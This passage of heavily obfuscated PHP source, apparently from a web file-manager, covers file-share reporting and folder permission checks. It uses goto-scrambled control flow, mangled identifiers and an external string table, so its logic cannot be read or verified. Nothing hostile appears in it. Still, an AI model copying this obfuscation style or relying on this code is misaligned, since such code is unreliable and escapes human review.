Model($bİòò°‘·Ò[533])->where($EÕÚ¾İµºØ)->delete(); goto fëœ¾Ñîˆ‡; Eìä¿˜î­ˆ: $bİòò°‘·Ò =& $_SERVER[Äº¡•ô™Ÿ]; $EÕÚ¾İµºØ = array($bİòò°‘·Ò[380] => array($bİòò°‘·Ò[381], $Fò¹ÇÓÁ‹Ã)); $E¯ìõ«ëŒ‚ = $this->field($bİòò°‘·Ò[437])->where($EÕÚ¾İµºØ)->select(); goto dˆŸ§òé×‹; dˆŸ§òé×‹: $E¯ìõ«ëŒ‚ = array_to_keyvalue($E¯ìõ«ëŒ‚, $bİòò°‘·Ò[33], $bİòò°‘·Ò[437]); if (!$E¯ìõ«ëŒ‚) { return; } $EÕÚ¾İµºØ = array($bİòò°‘·Ò[436] => array($bİòò°‘·Ò[381], $E¯ìõ«ëŒ‚)); goto b¶â×˜Ë¯†; fëœ¾Ñîˆ‡: } public function listAll($e†¦§µÈëô) { goto dŸ›Éóš; B‹ßİØÉ¯: $AõÛÊ áŸ‡ = $this->_makeOrder()->where($A¹“òÀ¾¥š)->selectPage(20); if (empty($AõÛÊ áŸ‡[$CĞˆ¨à¶Å[351]])) { return array(); } $this->_listDataApply($AõÛÊ áŸ‡[$CĞˆ¨à¶Å[351]]); goto a½»»¸ìÜ; dŸ›Éóš: $CĞˆ¨à¶Å =& $_SERVER[Äº¡•ô™Ÿ]; $A¹“òÀ¾¥š = array(); if ($e†¦§µÈëô[$CĞˆ¨à¶Å[1416]]) { $A¹“òÀ¾¥š[$CĞˆ¨à¶Å[1416]] = $e†¦§µÈëô[$CĞˆ¨à¶Å[1416]]; } goto AÃ„‰ÜÚÊ; AÃ„‰ÜÚÊ: if ($e†¦§µÈëô[$CĞˆ¨à¶Å[705]]) { $f¦‘‡¥©ì = $e†¦§µÈëô[$CĞˆ¨à¶Å[706]] ? $e†¦§µÈëô[$CĞˆ¨à¶Å[706]] : strtotime(date($CĞˆ¨à¶Å[2215])); $A¹“òÀ¾¥š[$CĞˆ¨à¶Å[184]] = array($CĞˆ¨à¶Å[318], array($e†¦§µÈëô[$CĞˆ¨à¶Å[705]], $f¦‘‡¥©ì)); } if ($e†¦§µÈëô[$CĞˆ¨à¶Å[29]]) { $A¹“òÀ¾¥š[$e†¦§µÈëô[$CĞˆ¨à¶Å[29]]] = 1; } else { $A¹“òÀ¾¥š[] = array($CĞˆ¨à¶Å[442] => array($CĞˆ¨à¶Å[928], 0), $CĞˆ¨à¶Å[444] => array($CĞˆ¨à¶Å[928], 0), $CĞˆ¨à¶Å[2190] => $CĞˆ¨à¶Å[2159]); } if ($e†¦§µÈëô[$CĞˆ¨à¶Å[2155]]) { $A¹“òÀ¾¥š[] = array($CĞˆ¨à¶Å[439] => $e†¦§µÈëô[$CĞˆ¨à¶Å[2155]], $CĞˆ¨à¶Å[1321] => array($CĞˆ¨à¶Å[754], "\45{$e†¦§µÈëô[$CĞˆ¨à¶Å[2155]]}\45"), $CĞˆ¨à¶Å[2190] => $CĞˆ¨à¶Å[2159]); } goto B‹ßİØÉ¯; a½»»¸ìÜ: return $AõÛÊ áŸ‡; goto D„È¡µİˆ; D„È¡µİˆ: } public function listDataApply($d¾È ¾¬êê) { $this->_listDataApply($d¾È ¾¬êê); return $d¾È ¾¬êê; } private function _listDataApply(&$AµéÍ†¾œÌ) { $fíŠŒ‚®µ =& $_SERVER[Äº¡•ô™Ÿ]; $B½É–ÕµÊ = array_to_keyvalue($AµéÍ†¾œÌ, $fíŠŒ‚®µ[33], $fíŠŒ‚®µ[1416]); $cÑ”ÛâÜÂë = Model($fíŠŒ‚®µ[473])->userListInfo(array_unique($B½É–ÕµÊ)); $A×ÌİíÇÜÛ = array_to_keyvalue($AµéÍ†¾œÌ, $fíŠŒ‚®µ[33], $fíŠŒ‚®µ[366]); $bàä•×Õœ¹ = Model($fíŠŒ‚®µ[755])->sourceListInfo($A×ÌİíÇÜÛ, !0); foreach ($AµéÍ†¾œÌ as &$f”¹åÈƒ±) { $eâ ¨è©’ = $f”¹åÈƒ±[$fíŠŒ‚®µ[1416]]; $f”¹åÈƒ±[$fíŠŒ‚®µ[2216]] = $cÑ”ÛâÜÂë[$eâ ¨è©’] ? $cÑ”ÛâÜÂë[$eâ ¨è©’] : !1; $DğŒöŒÒæš = $f”¹åÈƒ±[$fíŠŒ‚®µ[366]]; $f”¹åÈƒ±[$fíŠŒ‚®µ[388]] = $bàä•×Õœ¹[$DğŒöŒÒæš] ? $bàä•×Õœ¹[$DğŒöŒÒæš] : !1; } } private function _makeOrder($Eí‘£Ÿ«— = '') { goto A²§äŒÀÙ; A²§äŒÀÙ: $E‘ñê¨ŸŒ =& $_SERVER[Äº¡•ô™Ÿ]; $bˆÈÍ®ô–› = array($E‘ñê¨ŸŒ[184], $E‘ñê¨ŸŒ[706], $E‘ñê¨ŸŒ[2202], $E‘ñê¨ŸŒ[2203]); $E´œŠ¤£ = array($E‘ñê¨ŸŒ[398] => $E‘ñê¨ŸŒ[399], $E‘ñê¨ŸŒ[400] => $E‘ñê¨ŸŒ[401]); goto A‘ñ„ÚŒÈä; BêÍáœãÛ: $Eí‘£Ÿ«— = $Eí‘£Ÿ«— . "{$DÎÙ“½œÙ}\x20{$cĞĞ¥¤îŠÔ}"; return $this->order($Eí‘£Ÿ«—); goto cƒƒšºØâ; A‘ñ„ÚŒÈä: $DÎÙ“½œÙ = Input::get($E‘ñê¨ŸŒ[403], $E‘ñê¨ŸŒ[7], $E‘ñê¨ŸŒ[386], $bˆÈÍ®ô–›); $cĞĞ¥¤îŠÔ = Input::get($E‘ñê¨ŸŒ[404], $E‘ñê¨ŸŒ[7], $E‘ñê¨ŸŒ[2217], array($E‘ñê¨ŸŒ[2154], $E‘ñê¨ŸŒ[400])); $cĞĞ¥¤îŠÔ = $E´œŠ¤£[$cĞĞ¥¤îŠÔ]; goto BêÍáœãÛ; cƒƒšºØâ: } public function reportAdd($b·ì£ˆÛ) { $Cñ®èˆãÊ =& $_SERVER[Äº¡•ô™Ÿ]; $aÇ˜…„åæƒ = array($Cñ®èˆãÊ[437] => $b·ì£ˆÛ[$Cñ®èˆãÊ[437]], $Cñ®èˆãÊ[1416] => USER_ID); if (Model($Cñ®èˆãÊ[2213])->where($aÇ˜…„åæƒ)->find()) { return !1; } $FŒĞÀ‚Ü¬ = array($Cñ®èˆãÊ[437] => $b·ì£ˆÛ[$Cñ®èˆãÊ[437]], $Cñ®èˆãÊ[1321] => $b·ì£ˆÛ[$Cñ®èˆãÊ[1321]], $Cñ®èˆãÊ[366] => $b·ì£ˆÛ[$Cñ®èˆãÊ[366]], $Cñ®èˆãÊ[415] => $b·ì£ˆÛ[$Cñ®èˆãÊ[415]], $Cñ®èˆãÊ[1416] => USER_ID, $Cñ®èˆãÊ[29] => $b·ì£ˆÛ[$Cñ®èˆãÊ[29]], $Cñ®èˆãÊ[401] => $b·ì£ˆÛ[$Cñ®èˆãÊ[401]]); return Model($Cñ®èˆãÊ[2213])->add($FŒĞÀ‚Ü¬); } public function reportList($aÒ„ÙñÅÆå) { goto Cˆ°ÔÃŒÇ; fˆí¯’šš: $cà‹øÜ¿· = array($b‘ŞÄï›¤[398] => $b‘ŞÄï›¤[399], $b‘ŞÄï›¤[400] => $b‘ŞÄï›¤[401]); $fÏŞçÊ¥Å = $b‘ŞÄï›¤[2221] . $cà‹øÜ¿·[$eó†¿œÆù]; $dšĞ²£Ï£‰ = Model($b‘ŞÄï›¤[2213])->where($BãÊº–)->order($fÏŞçÊ¥Å)->selectPage(20); goto cæâ³ÌŠ„½; cæâ³ÌŠ„½: if (empty($dšĞ²£Ï£‰[$b‘ŞÄï›¤[351]])) { return array(); } $this->_listDataApply($dšĞ²£Ï£‰[$b‘ŞÄï›¤[351]]); return $dšĞ²£Ï£‰; goto cœ“£ëšÙ©; Cˆ°ÔÃŒÇ: $b‘ŞÄï›¤ =& $_SERVER[Äº¡•ô™Ÿ]; $BãÊº– = array(); if ($aÒ„ÙñÅÆå[$b‘ŞÄï›¤[705]]) { $F‡ÙÍîÃÌ— = $aÒ„ÙñÅÆå[$b‘ŞÄï›¤[706]] ? $aÒ„ÙñÅÆå[$b‘ŞÄï›¤[706]] : strtotime(date($b‘ŞÄï›¤[2215])); $BãÊº–[$b‘ŞÄï›¤[184]] = array($b‘ŞÄï›¤[318], array($aÒ„ÙñÅÆå[$b‘ŞÄï›¤[705]], $F‡ÙÍîÃÌ—)); } goto F´é¦—À‰¹; F´é¦—À‰¹: if (isset($aÒ„ÙñÅÆå[$b‘ŞÄï›¤[29]]) && in_array($aÒ„ÙñÅÆå[$b‘ŞÄï›¤[29]], array($b‘ŞÄï›¤[83], $b‘ŞÄï›¤[2218], $b‘ŞÄï›¤[2219], $b‘ŞÄï›¤[2220], $b‘ŞÄï›¤[1895]))) { $BãÊº–[$b‘ŞÄï›¤[29]] = $aÒ„ÙñÅÆå[$b‘ŞÄï›¤[29]]; } if (isset($aÒ„ÙñÅÆå[$b‘ŞÄï›¤[692]]) && in_array($aÒ„ÙñÅÆå[$b‘ŞÄï›¤[692]], array($b‘ŞÄï›¤[464], $b‘ŞÄï›¤[83], $b‘ŞÄï›¤[2218], $b‘ŞÄï›¤[2219]))) { $BãÊº–[$b‘ŞÄï›¤[692]] = $aÒ„ÙñÅÆå[$b‘ŞÄï›¤[692]]; } $eó†¿œÆù = Input::get($b‘ŞÄï›¤[404], $b‘ŞÄï›¤[7], $b‘ŞÄï›¤[2217], array($b‘ŞÄï›¤[2154], $b‘ŞÄï›¤[400])); goto fˆí¯’šš; cœ“£ëšÙ©: } public function reportStatus($b¶…Óâ»»‡) { goto Cø¤Ø•¢Ø; FÏ„æø´ÛÓ: return $d“ó•Ö˜ª; goto añÕé‚õ Õ; bÅøñóğ‰á: $d“ó•Ö˜ª = Model($E¡±Ùš”ùô[2213])->where($A‚óÌæ¡)->save($A°±á©â¿â); if ($b¶…Óâ»»‡[$E¡±Ùš”ùô[692]] == $E¡±Ùš”ùô[2218]) { if ($dØ†³¸½™[$E¡±Ùš”ùô[415]] != $E¡±Ùš”ùô[464] && $this->shareFileMeta($dØ†³¸½™[$E¡±Ùš”ùô[415]])) { $this->shareFileMeta($dØ†³¸½™[$E¡±Ùš”ùô[415]], 0); } return $this->remove($dØ†³¸½™[$E¡±Ùš”ùô[437]]); } if ($d“ó•Ö˜ª && $b¶…Óâ»»‡[$E¡±Ùš”ùô[692]] == $E¡±Ùš”ùô[2219]) { $c£ÉÈ–¯Şİ = $A°±á©â¿â[$E¡±Ùš”ùô[692]] == $E¡±Ùš”ùô[2219] ? 1 : 0; $this->shareFileMeta($dØ†³¸½™[$E¡±Ùš”ùô[415]], $c£ÉÈ–¯Şİ); $this->removeByFile($dØ†³¸½™[$E¡±Ùš”ùô[415]]); } goto FÏ„æø´ÛÓ; Cø¤Ø•¢Ø: $E¡±Ùš”ùô =& $_SERVER[Äº¡•ô™Ÿ]; $A‚óÌæ¡ = array($E¡±Ùš”ùô[364] => $b¶…Óâ»»‡[$E¡±Ùš”ùô[364]]); $dØ†³¸½™ = Model($E¡±Ùš”ùô[2213])->where($A‚óÌæ¡)->field($E¡±Ùš”ùô[2222])->find(); goto d„ÃƒŞš¢; d„ÃƒŞš¢: if (!$dØ†³¸½™) { return !1; } $A°±á©â¿â = array($E¡±Ùš”ùô[692] => $b¶…Óâ»»‡[$E¡±Ùš”ùô[692]]); if ($b¶…Óâ»»‡[$E¡±Ùš”ùô[692]] == $E¡±Ùš”ùô[2219] && $dØ†³¸½™[$E¡±Ùš”ùô[692]] == $E¡±Ùš”ùô[2219]) { $A°±á©â¿â[$E¡±Ùš”ùô[692]] = 0; } goto bÅøñóğ‰á; añÕé‚õ Õ: } private function removeByFile($F¬ø«°¨”) { goto Cç˜ÊÒÃ†×; a­»æàÙ¿•: $d¬ğ³º¾šÖ = array_to_keyvalue($Eèˆµ…âùÆ, $cñîÄ‰Èé¨[33], $cñîÄ‰Èé¨[437]); $this->remove($d¬ğ³º¾šÖ); goto b§±±ï‡¥…; Cç˜ÊÒÃ†×: $cñîÄ‰Èé¨ =& $_SERVER[Äº¡•ô™Ÿ]; $Eèˆµ…âùÆ = Model($cñîÄ‰Èé¨[755])->where(array($cñîÄ‰Èé¨[415] => $F¬ø«°¨”))->field($cñîÄ‰Èé¨[366])->select(); $d™ÌŠæÛÍ = array_to_keyvalue($Eèˆµ…âùÆ, $cñîÄ‰Èé¨[33], $cñîÄ‰Èé¨[366]); goto B’‡’¬’½‹; B’‡’¬’½‹: $f¢¥ˆĞ–é© = array($cñîÄ‰Èé¨[366] => array($cñîÄ‰Èé¨[7], $d™ÌŠæÛÍ), $cñîÄ‰Èé¨[442] => 1); $Eèˆµ…âùÆ = Model($cñîÄ‰Èé¨[2056])->where($f¢¥ˆĞ–é©)->field($cñîÄ‰Èé¨[437])->select(); if (empty($Eèˆµ…âùÆ)) { return; } goto a­»æàÙ¿•; b§±±ï‡¥…: } private function shareFileMeta($bØàŠ™ë, $c‰šÆƒ¥¯ê = null) { $câåõ¶å³Ê =& $_SERVER[Äº¡•ô™Ÿ]; $c¥äÏƒ‚ = array($câåõ¶å³Ê[415] => $bØàŠ™ë, $câåõ¶å³Ê[89] => $câåõ¶å³Ê[2223]); if (is_null($c‰šÆƒ¥¯ê)) { return Model($câåõ¶å³Ê[2224])->where($c¥äÏƒ‚)->find(); } $c¥äÏƒ‚[$câåõ¶å³Ê[356]] = $c‰šÆƒ¥¯ê; Model($câåõ¶å³Ê[2224])->add($c¥äÏƒ‚, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\x63\x65\137\x61\x75\164\x68"; public function getAuth($fçÆÍ¾¢Øˆ) { goto bË«õ¢ÛÂ; eÃĞ•«ùÎğ: return $a´º„‘ùàâ; goto bäÜîõçôÚ; bË«õ¢ÛÂ: $a±ã¦İĞìÛ =& $_SERVER[Äº¡•ô™Ÿ]; $Dïª„Øœ© = $a±ã¦İĞìÛ[2225]; $Fˆš§ó¢ÚÚ = array($a±ã¦İĞìÛ[366] => $fçÆÍ¾¢Øˆ); goto eÚ†–Ëï; eÚ†–Ëï: $DõÉ–İßÉ‰ = $this->field($Dïª„Øœ©)->order($a±ã¦İĞìÛ[364])->where($Fˆš§ó¢ÚÚ)->select(); $a´º„‘ùàâ = array(); foreach ($DõÉ–İßÉ‰ as $DØ¶¡©‹¶) { if (Model($a±ã¦İĞìÛ[2226])->listData($DØ¶¡©‹¶[$a±ã¦İĞìÛ[2207]])) { $a´º„‘ùàâ[] = $DØ¶¡©‹¶; } } goto eÃĞ•«ùÎğ; bäÜîõçôÚ: } public function setAuth($dÀš‚Ã„÷ğ, $BÆÚß¢Í) { goto dŞˆ¡í¼; BÂßİ´øÀ›: $this->where(array($Bó¾è¤À¼[380] => $dÀš‚Ã„÷ğ))->delete(); $this->addAll($eœ‰Ä”•æ); return !0; goto DÖêâš’Ú÷; f¿®ö·ãÃµ: $e¨›±°­Õ¢ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $eœ‰Ä”•æ = array(); foreach ($BÆÚß¢Í as $f¦­øÅöá) { if (!in_array($f¦­øÅöá[$Bó¾è¤À¼[368]], $e¨›±°­Õ¢)) { show_json(LNG($Bó¾è¤À¼[2227]), !1); } if ($bÉÃ¦„î–º != $DëÏµ¡ïÓ‚) { if ($f¦­øÅöá[$Bó¾è¤À¼[368]] == SourceModel::TYPE_GROUP) { } if ($f¦­øÅöá[$Bó¾è¤À¼[452]] != 0 && !in_array($f¦­øÅöá[$Bó¾è¤À¼[452]], $AÙá¾¦–Œ)) { } } if ($f¦­øÅöá[$Bó¾è¤À¼[452]] == 0) { $f¦­øÅöá[$Bó¾è¤À¼[368]] = SourceModel::TYPE_USER; } $eœ‰Ä”•æ[] = array($Bó¾è¤À¼[366] => $dÀš‚Ã„÷ğ, $Bó¾è¤À¼[368] => intval($f¦­øÅöá[$Bó¾è¤À¼[368]]), $Bó¾è¤À¼[452] => intval($f¦­øÅöá[$Bó¾è¤À¼[452]]), $Bó¾è¤À¼[2207] => intval($f¦­øÅöá[$Bó¾è¤À¼[2207]]) ? intval($f¦­øÅöá[$Bó¾è¤À¼[2207]]) : 0, $Bó¾è¤À¼[2208] => intval($f¦­øÅöá[$Bó¾è¤À¼[2208]]) ? intval($f¦­øÅöá[$Bó¾è¤À¼[2208]]) : -1); } goto BÂßİ´øÀ›; añ¼œ´•Ò³: $DëÏµ¡ïÓ‚ = 1; $bÉÃ¦„î–º = $fÎ¢»ŞÛŸ§[$Bó¾è¤À¼[452]]; if ($bÉÃ¦„î–º != $DëÏµ¡ïÓ‚) { $f¤£îµÜï¬ = array($Bó¾è¤À¼[2079] => $bÉÃ¦„î–º); $AÙá¾¦–Œ = Model($Bó¾è¤À¼[2153])->field($Bó¾è¤À¼[1416])->where($f¤£îµÜï¬)->select(); $AÙá¾¦–Œ = array_to_keyvalue($AÙá¾¦–Œ, $Bó¾è¤À¼[33], $Bó¾è¤À¼[1416]); } goto f¿®ö·ãÃµ; dŞˆ¡í¼: $Bó¾è¤À¼ =& $_SERVER[Äº¡•ô™Ÿ]; $fÎ¢»ŞÛŸ§ = Model($Bó¾è¤À¼[1110])->sourceInfo($dÀš‚Ã„÷ğ); if ($fÎ¢»ŞÛŸ§[$Bó¾è¤À¼[368]] != SourceModel::TYPE_GROUP) { return !1; } goto añ¼œ´•Ò³; DÖêâš’Ú÷: } public function authClear($eƒœ«÷’´) { $aÂĞ‘¨‰½ =& $_SERVER[Äº¡•ô™Ÿ]; $B†´ÓÚè‡ = Model($aÂĞ‘¨‰½[1110])->sourceInfo($eƒœ«÷’´); $fÍ˜ÊÏ»œ = array($eƒœ«÷’´); if ($B†´ÓÚè‡[$aÂĞ‘¨‰½[367]] == $aÂĞ‘¨‰½[83]) { $FÓ§ºÓ°ö« = array($aÂĞ‘¨‰½[521] => array($aÂĞ‘¨‰½[479], $B†´ÓÚè‡[$aÂĞ‘¨‰½[455]] . $eƒœ«÷’´ . $aÂĞ‘¨‰½[480])); $fÍ˜ÊÏ»œ = Model($aÂĞ‘¨‰½[1110])->field($aÂĞ‘¨‰½[380])->where($FÓ§ºÓ°ö«)->getField($aÂĞ‘¨‰½[366], !0); $fÍ˜ÊÏ»œ[] = $eƒœ«÷’´; } $this->where(array($aÂĞ‘¨‰½[380] => array($aÂĞ‘¨‰½[381], $fÍ˜ÊÏ»œ)))->delete(); return !0; } public function get($eÙ¨±á©‡Ş) { $fÊò§ñ³†š = $this->getSourceList(array($eÙ¨±á©‡Ş), !0); return $fÊò§ñ³†š[0]; } public function getSourceList($a—ÈÃ½ÚÑî, $bªìÕÁæî = false) { goto e‡©Ì‡•ÅÒ; fİš½ªŠÙ: $f•†øš‘Ÿ® = array(); foreach ($bªìÕÁæî as $AÏš¢¼¿“Œ => $b÷êÄœÖ) { $f•†øš‘Ÿ®[$AÏš¢¼¿“Œ] = $this->makeSourceAuth($b÷êÄœÖ, $Fàœ¿Ø™…È); } return $f•†øš‘Ÿ®; goto B¦¯Ì¿†½‡; AË³Ü†¥¢Ò: if (!$bªìÕÁæî) { $fÌ£ø…©¦Ò = array($C ŸŸÖÒ°ò[380] => array($C ŸŸÖÒ°ò[381], $a—ÈÃ½ÚÑî)); $bªìÕÁæî = $c«´¨ïâ‘õ->field($C ŸŸÖÒ°ò[2228])->where($fÌ£ø…©¦Ò)->select(); $bªìÕÁæî = array_to_keyvalue($bªìÕÁæî, $C ŸŸÖÒ°ò[366]); } $CåÀõƒ‚ƒ = $a—ÈÃ½ÚÑî; foreach ($bªìÕÁæî as $fƒææéòÉÃ => $BçâÁÑ£çÑ) { $B÷µÚˆ¸Â = $c«´¨ïâ‘õ->parentLevelArray($BçâÁÑ£çÑ[$C ŸŸÖÒ°ò[455]]); $CåÀõƒ‚ƒ = array_merge($CåÀõƒ‚ƒ, $B÷µÚˆ¸Â, array($fƒææéòÉÃ)); } goto C˜²Ñ˜ğ½†; b©¸šòè¹: $fÌ£ø…©¦Ò = array($C ŸŸÖÒ°ò[380] => array($C ŸŸÖÒ°ò[381], $CåÀõƒ‚ƒ)); $Fàœ¿Ø™…È = $this->field($B÷¨ÛîÌ‰)->where($fÌ£ø…©¦Ò)->select(); $Fàœ¿Ø™…È = array_to_keyvalue_group($Fàœ¿Ø™…È, $C ŸŸÖÒ°ò[366]); goto fİš½ªŠÙ; C˜²Ñ˜ğ½†: $CåÀõƒ‚ƒ = array_values(array_unique($CåÀõƒ‚ƒ)); if (!$CåÀõƒ‚ƒ) { return array(); } $B÷¨ÛîÌ‰ = $C ŸŸÖÒ°ò[2229]; goto b©¸šòè¹; e‡©Ì‡•ÅÒ: $C ŸŸÖÒ°ò =& $_SERVER[Äº¡•ô™Ÿ]; if (!$a—ÈÃ½ÚÑî) { return array(); } $c«´¨ïâ‘õ = Model($C ŸŸÖÒ°ò[1110]); goto AË³Ü†¥¢Ò; B¦¯Ì¿†½‡: } public function authDeepCheck($cáíÏ¥Ò¥, $Eµ¨«å¦°´ = false) { $EëÚ¾µ‡¥à =& $_SERVER[Äº¡•ô™Ÿ]; if (_get($GLOBALS, $EëÚ¾µ‡¥à[453])) { return !1; } $fˆ»‡µÁï = $this->makeAuthDeep(); if (!in_array($cáíÏ¥Ò¥, $fˆ»‡µÁï)) { return !1; } return array($EëÚ¾µ‡¥à[374] => -1, $EëÚ¾µ‡¥à[414] => array($EëÚ¾µ‡¥à[382] => $EëÚ¾µ‡¥à[1031], $EëÚ¾µ‡¥à[2085] => $EëÚ¾µ‡¥à[464], $EëÚ¾µ‡¥à[383] => LNG($EëÚ¾µ‡¥à[2230]), $EëÚ¾µ‡¥à[2097] => $EëÚ¾µ‡¥à[2231])); } protected function makeAuthDeep() { goto Få‰¬ĞÌ˜ô; d›ííá´ß²: $a×†¨º•ŠÀ = Model($aƒ¼Ï²¾[1110]); $f…Æë‰…é = Model($aƒ¼Ï²¾[454]); if ($C”Ş—ÁŠ») { $e‘ìç´½Ä¸ = $a×†¨º•ŠÀ->where(array($aƒ¼Ï²¾[366] => array($aƒ¼Ï²¾[381], $C”Ş—ÁŠ»)))->select(); foreach ($e‘ìç´½Ä¸ as $dëè¯¢åÁœ) { $D—ùœŠ‰‚ = $a×†¨º•ŠÀ->parentLevelArray($dëè¯¢åÁœ[$aƒ¼Ï²¾[455]]); $cÓÂÏ±¶¥  = array_merge($cÓÂÏ±¶¥ , $D—ùœŠ‰‚); $f›¬÷„Á½[] = $dëè¯¢åÁœ[$aƒ¼Ï²¾[452]]; } } goto F¤õÁ‘¦ÂÙ; cøŠõŸÂ: $f›¬÷„Á½ = array_values(array_unique($f›¬÷„Á½)); foreach ($f›¬÷„Á½ as $CÌÃÍì©“ğ) { $dİ¼µöîŞ¯ = $f…Æë‰…é->getInfo($CÌÃÍì©“ğ); $cÓÂÏ±¶¥ [] = $dİ¼µöîŞ¯[$aƒ¼Ï²¾[388]][$aƒ¼Ï²¾[366]]; } $cÓÂÏ±¶¥  = array_values(array_unique($cÓÂÏ±¶¥ )); goto aÜùã¾¢‘; DçÚˆ˜˜‚¯: $a‡÷º‹Øù = Model($aƒ¼Ï²¾[2232])->listData(); $FØ´§µ¸Ïå = array(); foreach ($a‡÷º‹Øù as $cĞ¡¸˜Ğµ) { if ($cĞ¡¸˜Ğµ[$aƒ¼Ï²¾[373]] == 0 && $cĞ¡¸˜Ğµ[$aƒ¼Ï²¾[2099]] == $aƒ¼Ï²¾[83]) { $FØ´§µ¸Ïå[] = $cĞ¡¸˜Ğµ[$aƒ¼Ï²¾[364]]; } } goto C™¯Ï×¨·§; aÜùã¾¢‘: return $cÓÂÏ±¶¥ ; goto bøÌõğ­®İ; Få‰¬ĞÌ˜ô: $aƒ¼Ï²¾ =& $_SERVER[Äº¡•ô™Ÿ]; static $cÓÂÏ±¶¥  = false; if ($cÓÂÏ±¶¥ ) { return $cÓÂÏ±¶¥ ; } goto DçÚˆ˜˜‚¯; F¤õÁ‘¦ÂÙ: $f›¬÷„Á½ = array_values(array_unique($f›¬÷„Á½)); $D®…ÃİË¹ = $f›¬÷„Á½; foreach ($D®…ÃİË¹ as $CÌÃÍì©“ğ) { $dİ¼µöîŞ¯ = $f…Æë‰…é->getInfo($CÌÃÍì©“ğ); $D—ùœŠ‰‚ = $a×†¨º•ŠÀ->parentLevelArray($dİ¼µöîŞ¯[$aƒ¼Ï²¾[455]]); $f›¬÷„Á½ = array_merge($f›¬÷„Á½, $D—ùœŠ‰‚); } goto cøŠõŸÂ; C£–ÒÁÙİˆ: $C”Ş—ÁŠ» = array_to_keyvalue($eìç Œ·å, $aƒ¼Ï²¾[33], $aƒ¼Ï²¾[366]); $cÓÂÏ±¶¥  = array(); $f›¬÷„Á½ = $CÅÅØ˜ƒæ; goto d›ííá´ß²; dèÜ ÂÒÜ: if ($CÅÅØ˜ƒæ) { $E‹¦©¿İä = array(array($aƒ¼Ï²¾[368] => SourceModel::TYPE_USER, $aƒ¼Ï²¾[452] => USER_ID), array($aƒ¼Ï²¾[368] => SourceModel::TYPE_GROUP, $aƒ¼Ï²¾[452] => array($aƒ¼Ï²¾[381], $CÅÅØ˜ƒæ)), $aƒ¼Ï²¾[916] => $aƒ¼Ï²¾[2159]); } if ($FØ´§µ¸Ïå) { $E‹¦©¿İä = array($E‹¦©¿İä, $aƒ¼Ï²¾[2207] => array($aƒ¼Ï²¾[2233], $FØ´§µ¸Ïå)); } $eìç Œ·å = $this->field($aƒ¼Ï²¾[2234])->where($E‹¦©¿İä)->select(); goto C£–ÒÁÙİˆ; C™¯Ï×¨·§: $CÅÅØ˜ƒæ = Session::get($aƒ¼Ï²¾[2191]); $CÅÅØ˜ƒæ = array_to_keyvalue($CÅÅØ˜ƒæ, $aƒ¼Ï²¾[33], $aƒ¼Ï²¾[2079]); $E‹¦©¿İä = array($aƒ¼Ï²¾[368] => SourceModel::TYPE_USER, $aƒ¼Ï²¾[452] => USER_ID); goto dèÜ ÂÒÜ; bøÌõğ­®İ: } private function makeSourceAuth($AÈŸ‹‡˜Ó, $e²Ê»º¥é¨) { goto E…Ò¸Ø¹µ; A·‹ì‚ª¿Ş: if (!$c¢œ–’áé) { $dİ¬Òá¼‰ã = array_to_keyvalue($dİ¬Òá¼‰ã, $b´äù‹õš[2079]); $DÅ¥ÂÎ¯ = $AÈŸ‹‡˜Ó[$b´äù‹õš[452]]; $Fº‘É››¾ = isset($dİ¬Òá¼‰ã[$DÅ¥ÂÎ¯]) ? $dİ¬Òá¼‰ã[$DÅ¥ÂÎ¯] : !1; if ($Fº‘É››¾) { $c¢œ–’áé = array($b´äù‹õš[2235] => intval($Fº‘É››¾[$b´äù‹õš[373]][$b´äù‹õš[373]]), $b´äù‹õš[2236] => $Fº‘É››¾[$b´äù‹õš[373]]); } } if ((!$c¢œ–’áé || $c¢œ–’áé[$b´äù‹õš[374]] <= 0) && $AÈŸ‹‡˜Ó[$b´äù‹õš[368]] == SourceModel::TYPE_GROUP) { $fš„ò´áì = $this->authDeepCheck($AÈŸ‹‡˜Ó[$b´äù‹õš[366]], $c¢œ–’áé); if ($fš„ò´áì) { $c¢œ–’áé = $fš„ò´áì; } } return $c¢œ–’áé; goto EÆìÉ¦òÍ²; E…Ò¸Ø¹µ: $b´äù‹õš =& $_SERVER[Äº¡•ô™Ÿ]; $dİ¬Òá¼‰ã = Session::get($b´äù‹õš[2191]); $fé”àÜ†† = Model($b´äù‹õš[1110])->parentLevelArray($AÈŸ‹‡˜Ó[$b´äù‹õš[455]]); goto F‰ ³§¶é; F‰ ³§¶é: $fé”àÜ†† = array_merge(array($AÈŸ‹‡˜Ó[$b´äù‹õš[366]]), array_reverse($fé”àÜ††)); $c¢œ–’áé = !1; foreach ($fé”àÜ†† as $bõìö÷Çù) { if (!isset($e²Ê»º¥é¨[$bõìö÷Çù])) { continue; } $Dñ®²Â§‰ = $this->authMake($e²Ê»º¥é¨[$bõìö÷Çù]); if ($Dñ®²Â§‰[$b´äù‹õš[414]]) { $c¢œ–’áé = $Dñ®²Â§‰; break; } } goto A·‹ì‚ª¿Ş; EÆìÉ¦òÍ²: } public function authOwnerApply($A‚™íÓ‰ø) { goto CÍÀ·£ÜŠÕ; Cƒ™–ó½•‰: $A‚™íÓ‰ø[$Ağ¼†İÑŞ¢[373]][$Ağ¼†İÑŞ¢[2239]] = Model($Ağ¼†İÑŞ¢[470])->userListInfo($BªáÜ¦š¥Š); return $A‚™íÓ‰ø; goto AÑŞÊÑßÚì; CÍÀ·£ÜŠÕ: $Ağ¼†İÑŞ¢ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($A‚™íÓ‰ø[$Ağ¼†İÑŞ¢[373]]) || isset($A‚™íÓ‰ø[$Ağ¼†İÑŞ¢[2237]]) && $A‚™íÓ‰ø[$Ağ¼†İÑŞ¢[2237]]) { return $A‚™íÓ‰ø; } if (AuthModel::authCheckRoot($A‚™íÓ‰ø[$Ağ¼†İÑŞ¢[373]][$Ağ¼†İÑŞ¢[374]])) { return $A‚™íÓ‰ø; } goto eÆ·¹ÒÅ†±; Dğ¦É·›Ê±: $f«Éè‹ˆ‘ = array(); $BªáÜ¦š¥Š = array(); foreach ($e©ë¾ŠÊ› as $c–È‹½à˜ì => $cÒÓÙ¥—ù) { $aĞ×¾…Ãä” = $this->authFolderOwnerUser($cÒÓÙ¥—ù); $f«Éè‹ˆ‘[$c–È‹½à˜ì] = $aĞ×¾…Ãä”; $BªáÜ¦š¥Š = array_merge($BªáÜ¦š¥Š, $aĞ×¾…Ãä”[$Ağ¼†İÑŞ¢[531]]); if ($aĞ×¾…Ãä”[$Ağ¼†İÑŞ¢[2238]]) { break; 